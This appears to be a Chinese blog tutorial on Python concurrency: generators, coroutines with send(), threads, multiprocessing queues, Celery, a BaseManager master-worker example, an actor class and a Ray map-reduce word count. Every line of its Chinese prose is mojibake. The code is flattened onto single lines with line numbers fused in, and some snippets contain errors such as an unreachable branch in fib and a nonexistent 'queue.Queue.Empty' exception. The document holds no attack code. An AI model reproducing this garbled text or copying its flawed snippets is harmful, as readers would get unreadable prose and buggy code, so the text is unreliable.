ç”Ÿæˆå™¨å°±æ˜¯ä¸€ä¸ªcallableï¼Œå®ƒç”Ÿæˆä¸€ä¸ªç»“æœåºåˆ—ï¼Œè€Œä¸æ˜¯è¿”å›ç»“æœã€‚è¿™æ˜¯é€šè¿‡äº§ç”Ÿï¼ˆé€šè¿‡yieldå…³é”®å­—ï¼‰å€¼è€Œä¸æ˜¯è¿”å›å€¼ 1234def mygenerator(n): while n: n -= 1 yield n next()ä»ç”Ÿæˆçš„åºåˆ—äº§ç”Ÿä¸€ä¸ªå€¼ï¼Œæœ¬è´¨ä¸Šï¼Œç”Ÿæˆå™¨æ˜¯ç®€åŒ–çš„è¿­ä»£å™¨ï¼Œå…å»äº†å®šä¹‰ç±»ä¸­__iter__å’Œ__next__çš„æ–¹æ³•ã€‚å¤–ï¼Œç”Ÿæˆå™¨æ˜¯ä¸€æ¬¡æ€§æ“ä½œï¼Œä¸èƒ½é‡å¤ç”Ÿæˆçš„åºåˆ—ã€‚ __iter__å’Œ__next__æ–¹æ³•ï¼Œè¿è¡Œäº†è¿­ä»£åè®®ï¼šå‰è€…è¿”å›äº†è¿­ä»£çš„å¯¹è±¡ï¼Œåè€…é€ä¸ªè¿”å›äº†åºåˆ—ä¸­çš„å…ƒç´ ã€‚ 12345678910class MyIterator(object): def __init__(self, xs): self.xs = xs def __iter__(self): return self def __next__(self): if self.xs: return self.xs.pop(0) else: raise StopIteration åç¨‹æœ‰ä¸‰ç§ä¸»è¦çš„ç»“æ„: yield()ï¼š ç”¨æ¥æš‚åœåç¨‹çš„æ‰§è¡Œ send()ï¼š ç”¨æ¥å‘åç¨‹ä¼ é€’æ•°æ®ï¼ˆä»¥è®©åç¨‹ç»§ç»­æ‰§è¡Œï¼‰ close()ï¼šç”¨æ¥å…³é—­åç¨‹ ç¤ºä¾‹ 1234567891011def complain_about(substring): print('Please talk to me!') try: while True: # æ‰§è¡Œåˆ°æ­¤å¤„ï¼Œæ§åˆ¶ç‚¹è¿”å›shellï¼Œç›´åˆ°å¤–éƒ¨sendæ•°æ®åˆ°yieldå¤„ï¼Œä¼ é€’ç»™text text = (yield) if substring in text: print('Oh no: I found a %s again!' % (substring)) except GeneratorExit: print('Ok, ok: I am quitting.') 1234567891011&gt;&gt;&gt; c = complain_about('Ruby')&gt;&gt;&gt; next(c)Please talk to me!&gt;&gt;&gt; c.send('Test data')&gt;&gt;&gt; c.send('Some more random text')&gt;&gt;&gt; c.send('Test data with Ruby somewhere in it')Oh no: I found a Ruby again!&gt;&gt;&gt; c.send('Stop complaining about Ruby or else!')Oh no: I found a Ruby again!&gt;&gt;&gt; c.close()Ok, ok: I am quitting. å¤åˆ¶ErrorOK! é€šè¿‡ next å¯åŠ¨åç¨‹ï¼Œcloseå…³é—­ã€‚ è¯æ±‡è®¡æ•°ç¤ºä¾‹ï¼Œæ–‡æœ¬æ¥è‡ªhttp://www.gutenberg.org/cache/epub/2600/pg2600.txtã€‚ é€è¡Œè¯»å–æ–‡ä»¶ï¼ˆé€šè¿‡catå‡½æ•°ï¼‰ï¼›ç»Ÿè®¡æ¯è¡Œä¸­substringçš„å‡ºç°æ¬¡æ•°ï¼ˆgrepåç¨‹ï¼‰ï¼›æ±‚å’Œå¹¶æ‰“å°æ•°æ®ï¼ˆcountåç¨‹ï¼‰ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from functools import wrapsdef coroutine(fn): @wraps(fn) def wrapper(*args, **kwargs): c = fn(*args, **kwargs) next(c) return c return wrapperdef cat(f, case_insensitive, child): if case_insensitive: line_processor = lambda l: l.lower() else: line_processor = lambda l: l for line in f: child.send(line_processor(line))@coroutinedef grep(sub_str, case_insensitive, child): if case_insensitive: sub_str = sub_str.lower() while True: text = (yield) # ç­‰å¾…sendå‘é€çš„æ•°æ® child.send(text.count(sub_str))@coroutinedef count(sub_str): n = 0 try: while True: n += (yield) except GeneratorExit: print(sub_str, n)@coroutinedef fanout(children): # å¤šä¸ªç›®æ ‡åŒæ—¶è¾“å…¥ï¼Œè®¡æ•° while True: data = (yield) for child in children: child.send(data)if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-i', action='store_true', dest='case_insensitive') parser.add_argument('pattern', type=str) parser.add_argument('infile', type=argparse.FileType('r')) args = parser.parse_args() cat(args.infile, args.case_insensitive, grep(args.pattern, args.case_insensitive, count(args.pattern))) cat( args.infile, args.case_insensitive, fanout( [grep(p, args.case_insensitive, count(p)) for p in args.pattern])) 1python grep.py -i love pg2600.txt å¹¶è¡Œè®¡ç®— å¦‚ä½•ä½¿ç”¨å¤šä¸ªCPUè¿›è¡Œå¹¶è¡Œç¼–ç¨‹çš„ã€‚å…·ä½“ç›®æ ‡æ˜¯åŠ é€ŸCPUå¯†é›†å‹ä»»åŠ¡ã€‚ å¤šçº¿ç¨‹ åœ¨å•CPUç³»ç»Ÿä¸­ï¼Œä½¿ç”¨å¤šçº¿ç¨‹å¹¶ä¸æ˜¯çœŸæ­£çš„å¹¶è¡Œï¼Œåœ¨ç»™å®šæ—¶é—´åªæœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨è¿è¡Œã€‚åªæœ‰åœ¨å¤šCPUè®¡ç®—æœºä¸Šï¼Œçº¿ç¨‹æ‰æ˜¯å¹¶è¡Œçš„ã€‚ å°½ç®¡Pythonçš„çº¿ç¨‹æ˜¯OSåŸç”Ÿçš„ï¼Œå…¨å±€é”å´ä½¿ç‰¹å®šæ—¶é—´åªæœ‰ä¸€ä¸ªæ˜¯è¿è¡Œçš„ã€‚ å½“ä¸€ä¸ªåç¨‹æˆ–è¿›ç¨‹ç­‰å¾…I/Oæ—¶ï¼Œè®©å¦ä¸€ä¸ªè¿è¡ŒCPUï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°å¹¶å‘çš„æ•ˆæœã€‚å½“ä¸€ä¸ªä»»åŠ¡éœ€è¦å ç”¨CPUå¤§é‡æ—¶é—´æ—¶ï¼ŒCPU Boundï¼Œå°±ä¸ä¼šæœ‰å¤šå¤§æé«˜ã€‚ 123456789101112131415161718192021222324252627from threading import Threadfrom queue import Queueimport urllib.requestURL = 'http://finance.yahoo.com/d/quotes.csv?s=&#123;&#125;=X&amp;f=p'def get_rate(pair, outq, url_tmplt=URL): with urllib.request.urlopen(url_tmplt.format(pair)) as res: body = res.read() outq.put((pair, float(body.strip())))if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('pairs', type=str, nargs='+') args = parser.parse_args() outputq = Queue() for pair in args.pairs: t = Thread(target=get_rate, kwargs=&#123;'pair': pair, 'outq': outputq&#125;) t.daemon = True # ç»“æŸæ—¶ï¼Œä¼šè‡ªè¡Œå›æ”¶çº¿ç¨‹èµ„æº t.start() for _ in args.pairs: pair, rate = outputq.get() print(pair, rate) outputq.task_done() outputq.join() å¤šè¿›ç¨‹ ä¸ºé¿å…å…¨å±€é”å¯¹CPUåˆ¶çº¦å‹çº¿ç¨‹çš„å½±å“ï¼Œä½¿ç”¨å¤šè¿›ç¨‹ã€‚å¤šè¿›ç¨‹æœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå®ƒå¿…é¡»å¯åŠ¨Pythonçš„å¤šä¸ªå®ä¾‹ï¼Œå¯åŠ¨æ—¶é—´é•¿ï¼Œè€—è´¹å†…å­˜å¤šã€‚ å¤šè¿›ç¨‹æœ‰å®ƒä»¬å„è‡ªçš„å†…å­˜ç©ºé—´ï¼Œä½¿ç”¨çš„æ˜¯æ— å…±äº«æ¶æ„ï¼Œæ•°æ®è®¿é—®ååˆ†æ¸…æ™°ã€‚ å®ç°å¹¶è¡Œè¿›ç¨‹ï¼Œpythonæä¾›ä¸¤ä¸ªmoduleï¼šmultiprocessingå’Œconcurrent.futures 1234567891011121314151617181920212223import concurrent.futures as cfdef fib(n): if n &lt;= 2: return 1 elif n == 0: return 0 elif n &lt; 0: raise Exception('fib(n) is undefined for n &lt; 0') return fib(n - 1) + fib(n - 2)if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-n', type=int, default=1) parser.add_argument('number', type=int, nargs='?', default=34) args = parser.parse_args() assert args.n &gt;= 1, 'The number of threads has to be &gt; 1' with cf.ProcessPoolExecutor(max_workers=args.n) as pool: results = pool.map(fib, [args.number] * args.n) åœ¨å››æ ¸å¤„ç†å™¨çš„è®¡ç®—æœºä¸Šè¿è¡Œæ—¶ï¼Œå¯ä»¥å®ç°çœŸæ­£çš„å¹¶è¡Œï¼Œè¿è¡Œä¸€æ¬¡åˆ°å››æ¬¡ï¼Œæ—¶é—´å·®ä¸å¤šã€‚ è¿›ç¨‹æ•°æ¯”å¤„ç†å™¨æ•°ç›®å¤šæ—¶ï¼Œæ€§èƒ½ä¼šæ€¥å‰§ä¸‹é™ã€‚ åœ¨å·¥ä½œè¿›ç¨‹ä¹‹é—´äº¤æ¢æ•°æ®ï¼Œåœ¨å­¦ä¹ Cæ—¶ï¼Œä¼šç”¨åˆ° ç®¡é“ (ä½¿ç”¨æœ€ç®€å•) ä¿¡å· (å¼€é”€æœ€å°) å…±äº«æ˜ å°„åŒº (æ— çˆ¶å­å…³ç³») æœ¬åœ°å¥—æ¥å­— (æœ€ç¨³å®š) multiprocessingæ¨¡å—æä¾›çš„æ–¹æ³•æ˜¯é˜Ÿåˆ—å’Œç®¡é“ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041import multiprocessing as mpdef fib(n): if n &lt;= 2: return 1 elif n == 0: return 0 elif n &lt; 0: raise Exception('fib(n) is undefined for n &lt; 0') return fib(n - 1) + fib(n - 2)def worker(inq, outq): \"inq ä»»åŠ¡é˜Ÿåˆ—ï¼Œ outq è¾“å‡ºé˜Ÿåˆ—\" while True: data = inq.get() if data is None: # æ£€æµ‹ å“¨å…µå€¼ return fn, arg = data outq.put(fn(arg))if __name__ == '__main__': import argparse parser = argparse.ArgumentParser() parser.add_argument('-n', type=int, default=1) parser.add_argument('number', type=int, nargs='?', default=34) args = parser.parse_args() assert args.n &gt;= 1, 'The number of threads has to be &gt; 1' tasks = mp.Queue() results = mp.Queue() for i in range(args.n): tasks.put((fib, args.number)) for i in range(args.n): mp.Process(target=worker, args=(tasks, results)).start() for i in range(args.n): print(results.get()) for i in range(args.n): # è¾“å…¥å“¨å…µå€¼ï¼Œåœæ­¢worker tasks.put(None) å¼€å‘å¹¶è¡Œåº”ç”¨çš„ä¸»è¦éš¾ç‚¹å°±æ˜¯æ§åˆ¶æ•°æ®è®¿é—®ï¼Œé¿å…ç«äº‰æ¡ä»¶æˆ–ç¯¡æ”¹å…±äº«æ•°æ®ã€‚è¦æ˜ç¡®ä½•æ—¶åœæ­¢ã€‚é˜¿å§†è¾¾å°”å®šå¾‹æŒ‡å‡ºï¼Œå¹¶è¡Œæ˜¯æ”¶ç›Šé€’å‡çš„ã€‚å¹¶è¡ŒåŒ–å¯èƒ½è€—æ—¶å·¨å¤§ã€‚ä¸€å®šè¦çŸ¥é“ï¼Œå“ªæ®µä»£ç æ˜¯éœ€è¦å¹¶è¡ŒåŒ–çš„ï¼Œç†è®ºåŠ é€Ÿä¸Šé™åˆæ˜¯å¤šå°‘ã€‚ å¦å¤–ï¼Œé¿å…æ”¶ç›Šé€’å‡çš„æ–¹æ³•æ˜¯å¢åŠ ä»»åŠ¡é‡ï¼Œæå‡å¹¶è¡Œä»»åŠ¡çš„å æ¯”ï¼Œè¿™æ˜¯å¤æ–¯å¡”å¤«æ£®å®šå¾‹çš„æ ¸å¿ƒã€‚ Celery Celeryï¼ˆhttp://www.celeryproject.orgï¼‰æ˜¯ç”¨åˆ°çš„ç¬¬ä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ã€‚Celeryæ˜¯ä¸€ä¸ªåˆ†å¸ƒä»»åŠ¡é˜Ÿåˆ—ï¼Œå°±æ˜¯ä¸€ä¸ªä»¥é˜Ÿåˆ—ä¸ºåŸºç¡€çš„ç³»ç»Ÿã€‚ è½»é‡åŒ–çš„é˜Ÿåˆ—ä»»åŠ¡è°ƒåº¦åŒ…ï¼šhttps://python-rq.org/ åˆ†åˆ«åœ¨ä¸»æœºå®‰è£…RabbitMQ ï¼ˆwindows: exe erlangï¼‰ï¼Œubuntuæœºå™¨å¼€å¯ redis-server ( sudo apt-get install redis-server )ï¼Œpythonç¯å¢ƒå®‰è£… celeryï¼Œredisã€‚ï¼ˆpip install celery[Redis]ï¼‰ å°±å­¦ä¹ ç¤ºä¾‹è€Œè¨€ï¼Œè‡ªå·±æ­å»ºæ•´ä¸ªç¯å¢ƒè€—æ—¶å¤ªå¤§ï¼Œå°¤å…¶åœ¨windowsç¯å¢ƒä¸‹ï¼æœ€å¥½èƒ½äº‘æœåŠ¡å™¨ç¯å¢ƒï¼Œåªç®¡å†™ä»£ç ï¼Œç¯å¢ƒä¸€èˆ¬ä¸ä¼šå‡ºé—®é¢˜ã€‚ ç›´æ¥åœ¨å‡ ä¸ªè™šæ‹Ÿæœºä¸Šæµ‹è¯•æ¯”è¾ƒæ–¹ä¾¿ã€‚ åœ¨æœºå™¨1ä¸Šï¼š 123456789import celery app = celery.Celery('test', broker='redis://192.168.56.104', backend='redis://192.168.56.103') @app.taskdef echo(message): return message å»ºç«‹æœºå™¨1ï¼Œworkeræ±  1celery -A test worker --loglevel=info celeryå‘½ä»¤ä¼šé»˜è®¤å¯åŠ¨CPUæ•°ç›®ç›¸åŒçš„workerè¿›ç¨‹ã€‚workerä¼šä½¿ç”¨testæ¨¡å—ä¸­çš„åº”ç”¨appï¼ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ä¾‹çš„åå­—celery -A test.app workerï¼‰ï¼Œå¹¶ä½¿ç”¨INFOç­‰çº§åœ¨æ§åˆ¶å°æ˜¾ç¤ºæ—¥å¿—ã€‚ åœ¨æœºå™¨2ä¸Šï¼ˆæ­¤å¤„å³ä¸º masterèŠ‚ç‚¹ï¼‰ï¼Œä¿å­˜ä¸€ä»½test.pyç›¸åŒä»£ç  è¿›å…¥ python äº¤äº’ç¯å¢ƒï¼š 1&gt;&gt;&gt; from test import echo 12&gt;&gt;&gt; res = echo.delay('Python rocks!')&gt;&gt;&gt; res.result å¯ä»¥åœ¨workeræœºå™¨ä¸Šæ‰§è¡Œç¨‹åºï¼Œå¹¶è¿”å›ç»“æœ åˆ†å¸ƒå¼ä»»åŠ¡é˜Ÿåˆ— master-workeræ¶æ„ï¼Œæœ‰ä¸€ä¸ªä¸­é—´ä»¶å±‚ï¼Œä¸­é—´ä»¶å±‚ä½¿ç”¨å¤šä¸ªä»»åŠ¡è¯·æ±‚é˜Ÿåˆ—ï¼ˆå³ä»»åŠ¡é˜Ÿåˆ—ï¼‰ï¼Œå’Œä¸€ä¸ªç”¨äºå­˜å‚¨ç»“æœçš„é˜Ÿåˆ—ï¼ˆå³ç»“æœåå°ï¼‰ã€‚ ä¸»è¿›ç¨‹ï¼ˆä¹Ÿå«ä½œclientæˆ–producerï¼‰å°†ä»»åŠ¡è¯·æ±‚å®‰æ’åˆ°æŸä¸ªä»»åŠ¡é˜Ÿåˆ—ï¼Œä»ç»“æœåå°è·å–æ•°æ®ã€‚workerè¿›ç¨‹è®¢é˜…ä»»åŠ¡é˜Ÿåˆ—ä»¥æ˜ç¡®ä»»åŠ¡æ˜¯ä»€ä¹ˆï¼Œå¹¶æŠŠç»“æœæ”¾åˆ°ç»“æœåå°ã€‚ åªç®¡å®šåˆ¶å¥½ ä»»åŠ¡é˜Ÿåˆ— å’Œ ç»“æœåå°ï¼Œå…¶ä»–workerã€producerå¦‚ä½•å˜åŒ–ã€ä»€ä¹ˆç¨‹åºéƒ½æ— æ‰€è°“ã€‚ ä¹Ÿç§°ä½œ Master Worker æ¨¡å¼ï¼š Master Worker ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839404142# master.pyimport random, time, queuefrom multiprocessing.managers import BaseManager# å‘é€ä»»åŠ¡çš„é˜Ÿåˆ—:task_queue = queue.Queue()# æ¥æ”¶ç»“æœçš„é˜Ÿåˆ—:result_queue = queue.Queue()# ä»BaseManagerç»§æ‰¿çš„QueueManager:class QueueManager(BaseManager): pass# æŠŠä¸¤ä¸ªQueueéƒ½æ³¨å†Œåˆ°ç½‘ç»œä¸Š, callableå‚æ•°å…³è”äº†Queueå¯¹è±¡:QueueManager.register('get_task_queue', callable=lambda: task_queue)QueueManager.register('get_result_queue', callable=lambda: result_queue)# ç»‘å®šç«¯å£5000, è®¾ç½®éªŒè¯ç 'abc':manager = QueueManager(address=('', 5000), authkey=b'abc')# å¯åŠ¨Queue:manager.start()# è·å¾—é€šè¿‡ç½‘ç»œè®¿é—®çš„Queueå¯¹è±¡:task = manager.get_task_queue()result = manager.get_result_queue()# æ³¨å†Œä»»åŠ¡for i in range(10): n = random.randint(0, 10000) print('Put task %d...' % n) task.put(n)# è¯»å–ç»“æœ:print('Try get results...')for i in range(10): r = result.get(timeout=10) print('Result: %s' % r)# å…³é—­:manager.shutdown()print('master exit.') 1234567891011121314151617181920212223242526272829303132333435363738394041# worker.pyimport time, sys, queuefrom multiprocessing.managers import BaseManager# å¯ä»¥åœ¨å¤šä¸ªæœºå™¨ä¸ŠåŒæ—¶å¼€å¯å¤šä¸ªworker# åˆ›å»ºç±»ä¼¼çš„QueueManager:class QueueManager(BaseManager): pass# ç”±äºè¿™ä¸ªQueueManageråªä»ç½‘ç»œä¸Šè·å–Queueï¼Œæ‰€ä»¥æ³¨å†Œæ—¶åªæä¾›åå­—:QueueManager.register('get_task_queue')QueueManager.register('get_result_queue')# è¿æ¥åˆ°æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯è¿è¡Œtask_master.pyçš„æœºå™¨:server_addr = '127.0.0.1'print('Connect to server %s...' % server_addr)# ç«¯å£å’ŒéªŒè¯ç æ³¨æ„ä¿æŒä¸task_master.pyè®¾ç½®çš„å®Œå…¨ä¸€è‡´:m = QueueManager(address=(server_addr, 5000), authkey=b'abc')# ä»ç½‘ç»œè¿æ¥:m.connect()# è·å–Queueçš„å¯¹è±¡:task = m.get_task_queue()result = m.get_result_queue()# ä»taské˜Ÿåˆ—å–ä»»åŠ¡,å¹¶æŠŠç»“æœå†™å…¥resulté˜Ÿåˆ—:for i in range(10): try: n = task.get(timeout=1) print('run task %d * %d...' % (n, n)) r = '%d * %d = %d' % (n, n, n * n) time.sleep(1) result.put(r) except queue.Queue.Empty: print('task queue is empty.')# å¤„ç†ç»“æŸ:print('worker exit.') ä½¿ç”¨ä¸­é—´ä»¶ä¼ é€’æ¶ˆæ¯ï¼ˆåŸºäºç½‘ç»œï¼‰ï¼Œç±»ä¼¼Goè¯­è¨€çš„channelï¼ˆåŸºäºå†…å­˜ï¼‰ã€‚ å¦ä¸€ç§æ¶ˆæ¯ä¼ é€’æ–¹å¼æ˜¯ï¼Œç›´æ¥ä¼ é€’ï¼ŒActoræ¨¡å‹ï¼Œä¸€èˆ¬æœ‰ä¸€ä¸ªGlobal Scheduleï¼Œè®¾è®¡çš„ç›®çš„æ˜¯è®¡ç®—ã€‚ Actoræ¶ˆæ¯ä¼ é€’ç¤ºä¾‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# actor.pyfrom queue import Queuefrom threading import Thread, Eventclass ActorExit(Exception): passclass Actor(object): def __init__(self): self._mailbox = Queue() def send(self, msg): \"å‘_mailboxæäº¤ä»»åŠ¡\" self._mailbox.put(msg) def recv(self): \"ä»_mailboxè·å–ä»»åŠ¡\" msg = self._mailbox.get() if msg is ActorExit: raise ActorExit() return msg def close(self): self.send(ActorExit) def start(self): \"å¯åŠ¨çº¿ç¨‹æ‰§è¡Œä»»åŠ¡\" self._terminated = Event() t = Thread(target=self._bootstrap) t.daemon = True t.start() def _bootstrap(self): try: self.run() except ActorExit: pass finally: self._terminated.set() def join(self): self._terminated.wait() def run(self): ''' Run method to be implemented by the user ''' while True: msg = self.recv() 12345678910111213141516171819202122232425262728293031323334353637383940# test_actor.pyfrom .actor import Actorfrom threading import Eventclass Result(object): def __init__(self): self._evt = Event() self._result = None def set_result(self, value): self._result = value self._evt.set() # å½“æ‰§è¡Œå®Œæˆè®¡ç®—ä»»åŠ¡æ—¶ï¼Œè§£é™¤block @property def result(self): self._evt.wait() # ç­‰å¾…è®¡ç®—ç»“æœç¨‹åºçš„æ‰§è¡Œå®Œæˆï¼Œthread block return self._resultclass Worker(Actor): def submit(self, func, *args, **kwargs): \"æ³¨å†Œä»»åŠ¡\" r = Result() self.send((func, args, kwargs, r)) return r def run(self): \"é‡å†™actorçš„runé€»è¾‘ï¼Œæ‰§è¡Œç”¨æˆ·ç¨‹åº\" while True: func, args, kwargs, r = self.recv() r.set_result(func(*args, **kwargs))if __name__ == '__main__': worker = Worker() worker.start() r = worker.submit(pow, 2, 4) print('it will not block') print(r.result) Ray åŸºäºMaster Slavesï¼ŒActorçš„åˆ†å¸ƒå¼æ¡†æ¶ã€‚DOC tutorialsã€‚åˆ†å¸ƒè®¡ç®—ã€æ·±åº¦å­¦ä¹ è°ƒå‚ç­‰ç­‰ï¼Œå¯æ˜¯è¯·é—® åœ¨ä¸‹å»å“ªé‡Œèƒ½é¢†åˆ°æ›´å¤šçš„ç‰©ç†æœºå™¨å‘¢ã€‚ã€‚ã€‚ Global Schedulerï¼šMasterä¸Šå¯åŠ¨äº†ä¸€ä¸ªå…¨å±€è°ƒåº¦å™¨ï¼Œç”¨äºæ¥æ”¶æœ¬åœ°è°ƒåº¦å™¨æäº¤çš„ä»»åŠ¡ï¼Œå¹¶å°†ä»»åŠ¡åˆ†å‘ç»™åˆé€‚çš„æœ¬åœ°ä»»åŠ¡è°ƒåº¦å™¨æ‰§è¡Œ Redis Serverï¼šMasterä¸Šå¯åŠ¨äº†ä¸€åˆ°å¤šä¸ªRedis Serverç”¨äºä¿å­˜åˆ†å¸ƒå¼ä»»åŠ¡çš„çŠ¶æ€ä¿¡æ¯ï¼ˆControlStateï¼‰ï¼ŒåŒ…æ‹¬å¯¹è±¡æœºå™¨çš„æ˜ å°„ã€ä»»åŠ¡æè¿°ã€ä»»åŠ¡debugä¿¡æ¯ç­‰ã€‚ Local Schedulerï¼šæ¯ä¸ªSlaveä¸Šå¯åŠ¨äº†ä¸€ä¸ªæœ¬åœ°è°ƒåº¦å™¨ï¼Œç”¨äºæäº¤ä»»åŠ¡åˆ°å…¨å±€è°ƒåº¦å™¨ï¼Œä»¥åŠåˆ†é…ä»»åŠ¡ç»™å½“å‰æœºå™¨çš„Workerè¿›ç¨‹ Workerï¼šæ¯ä¸ªSlaveä¸Šå¯ä»¥å¯åŠ¨å¤šä¸ªWorkerè¿›ç¨‹æ‰§è¡Œåˆ†å¸ƒå¼ä»»åŠ¡ï¼Œå¹¶å°†è®¡ç®—ç»“æœå­˜å‚¨åˆ°Object Storeï¼Œæ¯ä¸€ä¸ªæœ‰å…¨å±€å”¯ä¸€çš„ Object ID Object Storeï¼šæ¯ä¸ªSlaveä¸Šå¯åŠ¨äº†ä¸€ä¸ªObject Storeå­˜å‚¨åªè¯»æ•°æ®å¯¹è±¡ï¼ŒWorkerå¯ä»¥é€šè¿‡å…±äº«å†…å­˜çš„æ–¹å¼è®¿é—®è¿™äº›å¯¹è±¡æ•°æ®ï¼ˆé€šè¿‡Object IDï¼‰ï¼Œè¿™æ ·å¯ä»¥æœ‰æ•ˆåœ°å‡å°‘å†…å­˜æ‹·è´å’Œå¯¹è±¡åºåˆ—åŒ–æˆæœ¬ã€‚Object Storeåº•å±‚ç”±Apache Arrowå®ç° Plasmaï¼šæ¯ä¸ªSlaveä¸Šçš„Object Storeéƒ½ç”±ä¸€ä¸ªåä¸ºPlasmaçš„å¯¹è±¡ç®¡ç†å™¨è¿›è¡Œç®¡ç†ï¼Œå®ƒå¯ä»¥åœ¨Workerè®¿é—®æœ¬åœ°Object Storeä¸Šä¸å­˜åœ¨çš„è¿œç¨‹æ•°æ®å¯¹è±¡æ—¶ï¼Œä¸»åŠ¨æ‹‰å–å…¶å®ƒSlaveä¸Šçš„å¯¹è±¡æ•°æ®åˆ°å½“å‰æœºå™¨ Rayç®€æ˜“ç¯å¢ƒæ­å»º é…ç½®Conda 123$ wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh$ sh Miniconda3-latest-Linux-x86_64.sh å®‰è£…Rayï¼Œæ¨èpython3.7ï¼Œå…¶ä»–ç‰ˆæœ¬å­˜åœ¨å·²çŸ¥çš„Bugï¼ˆå®˜æ–¹ï¼‰ 12345$ conda create --name ray python=3.7$ conda activate ray$ pip install ray Ray é›†ç¾¤æ­å»º: éƒ¨ç½²RedisæœåŠ¡(ä¸‹é¢å‡è®¾éƒ¨ç½²åœ¨localhost:6379) é€‰æ‹©ä»»æ„ä¸€å°ä¸»æœºä½œä¸ºMasterå¯åŠ¨ ray start --head --ip localhost --redis-port=6379 åœ¨é›†ç¾¤å…¶ä»–æœºå™¨ä¸Šå¯åŠ¨ ray start --address=[head_node_address]:6379 è¿è¡Œä¸€ä¸ªMap Reduceç¤ºä¾‹ã€‚æ•°æ®å‡†å¤‡ï¼Œä¸‹è½½Wikiæ•°æ®ï¼Œä½¿ç”¨WikiExtractorè§£æï¼š 12$ wget https://dumps.wikimedia.org/enwiki/latest/enwiki-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2$ python WikiExtractor.py -o /data enwiki-latest-pages-articles-multistream9.xml-p1791081p2336422.bz2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import argparsefrom collections import Counter, defaultdictimport heapqimport numpy as npimport osimport rayparser = argparse.ArgumentParser()parser.add_argument(\"--num-mappers\", help=\"number of mapper actors used\", default=3, type=int)parser.add_argument(\"--num-reducers\", help=\"number of reducer actors used\", default=4, type=int)@ray.remoteclass Mapper(object): def __init__(self, content_stream): self.content_stream = content_stream self.num_articles_processed = 0 self.articles = [] self.word_counts = [] def get_new_article(self): article = self.content_stream.next() # Count the words and store the result. self.word_counts.append(Counter(article.split(\" \"))) self.num_articles_processed += 1 def get_range(self, article_index, keys): \"\"\"keys: list of 2 chars article_indexï¼šå½“å‰mapperå¤„ç†çš„æ–‡ç« indexï¼Œéœ€è¦ä¸GlobalSchedulerä¸­ä»»åŠ¡å‚æ•°è¿›è¡Œé€šä¿¡ï¼Œ ä¿è¯å½“å‰articleåœ¨æ•´ä¸ªå¤„ç†åºåˆ—ä¸­å¤„äºarticle_indexçš„ä½ç½®\"\"\" # Process more articles if this Mapper hasn't processed enough yet. while self.num_articles_processed &lt; article_index + 1: self.get_new_article() # Return the word counts from within a given character range. return [(k, v) for k, v in self.word_counts[article_index].items() if len(k) &gt;= 1 and k[0] &gt;= keys[0] and k[0] &lt;= keys[1]]@ray.remoteclass Reducer(object): def __init__(self, keys, *mappers): \"é’ˆå¯¹ä¸åŒèŒƒå›´çš„å¼€å¤´å­—æ¯åŒºé—´ï¼Œè¿›è¡Œreduce\" self.mappers = mappers self.keys = keys def next_reduce_result(self, article_index): word_count_sum = defaultdict(lambda: 0) # Get the word counts for this Reducer's keys from all of the Mappers # and aggregate the results. count_ids = [ mapper.get_range.remote(article_index, self.keys) for mapper in self.mappers ] # From many Mappers for count_id in count_ids: for k, v in ray.get(count_id): word_count_sum[k] += v return word_count_sumdef get_content(file, floder='/data/'): file = floder + file f = open(file, 'r') return f.read()class Stream(object): \"æ•°æ®æµç”Ÿæˆ\" def __init__(self, max, folder): \"\"\"max: æœ€å¤§æå–æ–‡ä»¶æ•°é‡ folder: æ–‡ä»¶å¤¹åç§° \"\"\" self.index = 0 self.max = max self.folder = folder self.g = None def init(self): self.g = self.content() def file(self): return f\"wiki_&#123;0&#125;&#123;self.index&#125;\" if self.index &lt; 10 else f\"wiki_&#123;self.index&#125;\" def content(self): while self.index &lt; self.max: yield get_content(self.file(), self.folder) self.index += 1 def next(self): \"ç”Ÿæˆå™¨\" if not self.g: self.init() return next(self.g)if __name__ == \"__main__\": MAX = 10 args = parser.parse_args() ray.init() # Create one streaming source of articles per mapper. directory = os.path.dirname(os.path.realpath(__file__)) streams = [] folders = ['/data/AA/', '/data/AB/', '/data/AC/'] for i in range(args.num_mappers): streams.append(Stream(MAX, folders[i % len(folders)])) # Partition the keys among the reducers. chunks = np.array_split([chr(i) for i in range(ord(\"a\"), ord(\"z\") + 1)], args.num_reducers) keys = [[chunk[0], chunk[-1]] for chunk in chunks] # Create a number of mappers. mappers = [Mapper.remote(stream) for stream in streams] # Create a number of reduces, each responsible for a different range of # keys. This gives each Reducer actor a handle to each Mapper actor. reducers = [Reducer.remote(key, *mappers) for key in keys] # Most frequent 10 words. article_index = 0 while True: print(\"article index = &#123;&#125;\".format(article_index)) wordcounts = &#123;&#125; counts = ray.get([ reducer.next_reduce_result.remote(article_index) for reducer in reducers ]) for count in counts: wordcounts.update(count) most_frequent_words = heapq.nlargest(10, wordcounts, key=wordcounts.get) for word in most_frequent_words: print(\" \", word, wordcounts[word]) article_index += 1 ç„¶åï¼Œåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¿å­˜ä¸€ä»½ä»£ç ï¼Œå¯åŠ¨workerå’ŒmasterèŠ‚ç‚¹ 1234ray start --head --ip localhost --redis-port=6379 # ä¿®æ”¹head_node_addressä¸º master èŠ‚ç‚¹çš„ipåœ°å€ray start --address=[head_node_address]:6379 